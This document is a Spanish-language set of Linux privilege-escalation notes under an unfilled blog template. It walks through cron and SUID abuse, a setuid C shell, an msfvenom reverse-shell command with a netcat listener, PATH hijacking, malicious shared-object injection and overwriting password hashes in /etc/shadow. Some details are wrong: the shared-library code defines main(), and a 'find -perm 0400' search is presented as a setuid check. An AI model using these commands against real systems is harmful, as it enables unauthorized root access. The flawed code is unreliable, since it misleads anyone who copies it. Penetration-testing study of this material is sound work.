---
title: "Título de tu blog post"
date: 2022-04-08
description: 'Descripción de tu blog post'
---

#======================================================================================================================================
#================================================= PRIVILEGE ESCALATION LINUX =========================================================
#======================================================================================================================================
$PERMISOS

En linux los permisos se establecen entres niveles:
- Permisos de propietario
- Permisos del grupo
- Permisos del resto de usr ("otros")

-Las cunetas de usr se configuran en /etc/passwd
-Los hash de las contraseñas se almacenana en /etc/shadow
-Cada uno de los usuarios se identifican bajo un identificador llamado UID (User Identifier)
-Hay 3 tipos de UID definidos para un proceso:
    *Real: es la cta del propietario de este proceso. Define a que files tiene acceso este proceso.
    *Effective: Lo mismo que realID, pero aveces se cambia para permitir que un usr sin privilegios acceda a files de usr root
    *Save: se usa cuando un proceso q se ejecuta con privilegios de root necesita hacer un trabajo poco privilegiado, esto se puede lograr cambiando temporalmente a una cta no privilegiada
-Los grupos de usr  se configuran en /etc/group, por default el grupo rpincipal del usr  tiene el mismo
    nombre como su cuenta de usuario
-Todos los files y directoriosposeen un unico propietario y un unico grupo y los permisos se definen como:
    lecturta (r) escritura (w) y ejecucion (x)
-Existen 3 conjuntos de permisos uno para propietario otro para grupo y uno para todos los "otros"
 
                 U   G   O
                rwx rwx rwx     =>  rwx rwx rwx
                111 111 111          7   7   7

-Sólo el propietario del directorio o file puede cambiar los permisos
-cada 3 caracteres se refiere a los permisos de propietario grupo y otros
-Hay otro tipo de permisos. se trata del bit de permisos SUID (Set User ID), el bit de permisos SGID (Set Group ID)
    Estos permisos estan representados por una 'S' en la posicion de executcion
-SUID es asignable a ficheros ejecutables y permite q cuando un usr ejecute dicho file, el proceso adquiera los permisos del propietario del file ejecutado.
-GUID permite adquirir los permisos del grupo asignado al file, tambien es asignable a directorios. Esto sera muy util cuando
    varios usrs del mismo grupo necesiten trabajar con recursos dentro de un mismo directorio.

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
$METODOLOGIA

1. Identificar el usuario y los privilegios que tiene                                                               **NOTA:
    $whoami                                                                                                                 - Realizar pruebas con cosas que no requieran muchos pasos por ejemplo:
    $id                                                                                                                        sudo, cronjobs, archivos SUID
2. Identificar la version del sistema                                                                                       - Revisar procesos root enumerar versiones y buscar exploits de esa version    
    $uname -a
    $cat /etc/*release
3. Identificacion de debilidades en el sistema (aplicaciones, servicios, permisos, etc)
    $lse -i l2 
    $Linenum -s -k passwd //busca archivos con pass hardcodeados 
4. Numeracion manual
    https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
5. Revisar archivos en escritorio o en /var/backup, /var/logs, historial de comandos

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
$TOOLS (Github)

-Linux Smart Enumeration
-LinEnum
-Linux-Exploit suggester-2 (Principalmente para buscar exploit de kernel)
-PSPY
-LinuxPriceChecker
-Unix-Privesec-chek

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

$TAREAS CRON (tareas programadas)
-Es una tarea q se ejecuta a nivel de sistema a intervalos de tiempo (cada minuto, cada 3 hrs, etc)
En /etc/crontab se encuentran todos los archivos cron configurados
-Para crear una tarea cron se guarda un file en /etc/cron.d y se inicia el demonio cron
-La estructura de la tarea cron tiene 5 campos

*   *   *   *   *  <usr que ejecutara> <Comando a ejecutar o path del binario>
_   _   _   _   _
|   |   |   |   |
|   |   |   |   |_______________ dia de la semana (1-7)
|   |   |   |___________________ mes (1-12)
|   |   |_______________________ dia de mes (1-31)
|   |___________________________ Hora (0-23)
|_______________________________ min (0-59)


- Para explotar tareas cron hacemos numerasion para ver q comandos se estan ejecutando
$ps -eo command
- Buscar si hay tareas cron o binarios que se ejecuten en segundo plano
- Revisar que permisos tienen ese binario y si tiene permisos de escrituraes posible editar ese binario para cambiar permisos a la /bin/bash (ej. chmod 4755 /bin/bash)
- Despues de agregar permisos SUID a la bash lanzamos bash -p


-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
$CREASION DE SHELL

SHELL ASROOT
-Una de las formas es realizar una copia del binario /bin/bash usualmente lo llamammos "asroot", para realizar esto nos aseguraremos que el binario mantenga las propiedades
del usr root y que tenga el bit SUID establecido
-Posterior a la copia ejecutamos el binario como "asroot -p" para ganar acceso root

SHELL COMPILADA
-Puede haber casos en los q algun proceso root ejecuta otro proceso que puede controlar, el siguiente codigo C genera una shell bash root
    #include <stdio.h>
    #include <stdlib.h>
    int main ()
    {
        setuid(0);
        system("/bin/bash -p");
    }
-Para compilar el archivo .c
gcc -wall -m32 -o linux-shell file.c  //Para 32 bits
gcc -wall -m64 -o linux-shell file.c  //Para 64 bits

SHELL MSFVENOM
msfvenom -p linux/shell_inverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf


REVSHELL
-Se generan diferentes tipos de shell nativas (.py, .pl, .php, mknod, .rb, etc) con la herramienta revshell desarrollada por dplastico la cual nos ayudara a escalar privilegios de forma nativas

Para resivir esas conexiones se utlizara un listener de netcat
#nc -lvnp <port>  // se recomiendan usar puertos comunes Ej. 80,443,53,etc

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
$EXPLOITS DE kernel

-Enumerar la version de kernel (#uname -a)
-Buscar un explot para la version

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
$EXPLOITS DE SERVICIOS

-Un servicio es un programa q se ejecuta en segundo plano cuando inica el SO y aseptan entradas o realizan tareas regulares
-si los servicios se ejecutan como root, explotarlos puede conducir a la ejecucion de comandos root
-Numerar los procesos que se ejecutan como root
$ ps aux | grep "^root"
-Dentro los resultados obtenidos intente identificar el versionado o enumerar Ej:
$<programa> -v/--version
dpkg -l | grep <programa>
rpm -qa |grep <programa> 
-Buscar algun exploit
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
$EXPLOTANDO PERMISOS DE ARCHIVOS (SUID/SGID)

-Se pueden aprovechar ciertos files del sistema para realizar escalada de privilegiada                                                                 ***NOTA:
-Si un file tien informacion confidencial q podamos leer, este puede ser utlizado para obtener acceso root                                                      El hash de shadow es sha512 y se puede crear
-Si se puede escribir en un file podemos modificar la forma en que funciona y obtener acceso root                                                               un pass con:
- Para verificar permisos debiles en un file buscamos programas q establescan el bit setui                                                                      mkpasswd -m sha-512 nuevopass
            $ find / -type f -perm 0400 -ls 2>/dev/null                                                                                                         y poder sustituirlo en /etc/shadow
-buscamos todos los archivos que podamos leer y escribir en /etc                                                                                                con:
            $ find /etc -maxdepth 1 -readable -type f                                                                                                           openssl passwd "nuevopass"
                                                                                                                                                               creamos un hash de pass para sustituirlo en /etc/passwd
-Hay algunos comandos ejecutables  que pueden permitir escalacion de privilegios: bash, cat, cp, echo, find, less, more, nano, nmap, vim, etc
-Asi como se pueden usar secuencias de escape de shell con programas q se ejecutan con sudo, podemos hacer lo mismo con los files SUID/SGID
    Ej:
        1. numeramos con lse o de manera manual en busca de binarios consetuid
            find / -type f -a \(-perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null //numeracion manual
        2.verificamos versionado de los binarios y buscamos vulnerabilidades para escalar privilegios

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
$ARCHIVO BACKUP

-Una maquina puede tener los permisos bien configurados, pero un usr pudo haber crado copias de seguridad insegura de estos archivos
-Siempre vale la pena explorar el sistema de archivos en busca de archivos de respaldo legibles. Algunos paths comunes incluyen directorios de inicio de usr
/root, /tmp, /var/backups

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
$ESCALACION CON SUDO

-SU permite usar la terminal de otro usr sin necesidad de cerrar sesion. 
-A diferencia de SU, SUDO pide a los usr su propia contraseña en lugar de la del usr requerido
-Enlistar programas permitidos por SUDO
$sudo -l

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
$PATH HAIJACKING

-El archivo que ejecuta un comando de manera relativa re quiere permisoso SUID
-Buscar archivos con permisos SUID o 400
find / -perm -u=s -type f 2>/dev/null
-Crear un binario y damos permisos de ejecucion
-Alteramos el PATH con la ruta del binario creado 
-Ej:
cd /tmp
echo "bash -p" > archivomalo.sh //Creando archivo bin para que abra una bash
chmod +x archivomalo.sh
export PATH=/tmp:$PATH //secuestrando el path
cd /home/usuario
./archivo_que_ejecuta_comandos

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
$INYECTION DE OBJETOS COMPARTIDOS (SUID)

-Cuando se ejecuta un rpograma este intentara cargar los objetivos compartidos que requiere para su ejecucion
-Al usar un programa llamado "strace" podemos rastrear estas llamadas al sistema y determinar si no se encontraron objetos compartidos
-Si podemos escribir en la ubicacion que el programa intenta abrir, podemos crear un objeto compartido y generar una shell root
Ej:
    1. numeramos binarios 
        find / -type f -a \(-perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null //numeracion manual
    2. tracqueamos el binario para ver q librerias compartidas que usa y cuales faltan para crear una maliciosa
        strace <path_binario> 
    3. creamos la libreria con el mismo nombre 
        vi libcalc.c
            =code=
                #include <stdio.h>
    #include <stdlib.h>
    int main ()
    {
        setuid(0);
        system("/bin/bash -p");
    }
    4. compilamos y despues lo movemos al path de donde es llamado
        gcc -shared -fPIC -o libcalc.so libcalc.c
    5.finalmente ejecutamos denuevo el binario

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
$NFS

-Identificacion de servicios NFS
    nmap -p 111 --script nfs* <IP>
    mount -o rw,vers=2 <target>:<share> <localdirectory>

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
$CAPABILITIES (Persistencia privilegiada)
-Numerar capabilities en binarios
    getcap -r / 2>/dev/null
- revisar las cap_setiud principalmente


-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
$CONTRASEÑAS

-Indagar en archivos de configuracion o en el historial de comandos
-Con la tool LinEnum podemos hacer una busqueda por la palabra password
    linenum.sh -s -k password

OPENVPN
-Identificar archivos .ovpn
